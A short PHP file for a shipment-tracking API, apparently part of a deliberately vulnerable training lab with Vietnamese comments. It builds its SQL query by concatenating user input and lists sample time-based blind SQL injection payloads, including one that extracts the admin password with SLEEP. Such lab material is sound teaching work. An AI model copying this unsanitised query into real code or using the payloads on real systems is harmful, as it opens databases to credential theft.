<?php
/**
 * track_api.php — API JSON tra cuu van don: /api/track?tracking=
 *
 * !!! DIEM INJECT: Blind TIME-based !!!
 * Response CHI tra {found:true/false} + vai truong co ban -> khong lo du lieu.
 * Nhung query van chay -> dung SLEEP()/IF() de suy luan qua DO TRE.
 * Payload mau (tracking):
 *   ILF1042CN' AND SLEEP(5)-- -
 *   ILF1042CN' AND IF(SUBSTRING(database(),1,1)='i',SLEEP(5),0)-- -
 *   nonexistent' OR IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='p',SLEEP(5),0)-- -
 */
header('Content-Type: application/json; charset=utf-8');

$tracking = $_GET['tracking'] ?? '';

// !!! NOI CHUOI — khong sanitize -> Time-based SQLi !!!
$sql = "SELECT tracking_no, port_code, status FROM shipments WHERE tracking_no = '$tracking'";

$conn = db();
$res = mysqli_query($conn, $sql);

if ($res === false) {
    // API "nuot" loi -> khong lo ra front-end (khac voi Error-based endpoint)
    echo json_encode(['found' => false]);
    exit;
}

if (mysqli_num_rows($res) > 0) {
    $row = mysqli_fetch_assoc($res);
    echo json_encode([
        'found'       => true,
        'tracking_no' => $row['tracking_no'],
        'port_code'   => $row['port_code'],
        'status'      => $row['status'],
    ]);
} else {
    echo json_encode(['found' => false]);
}
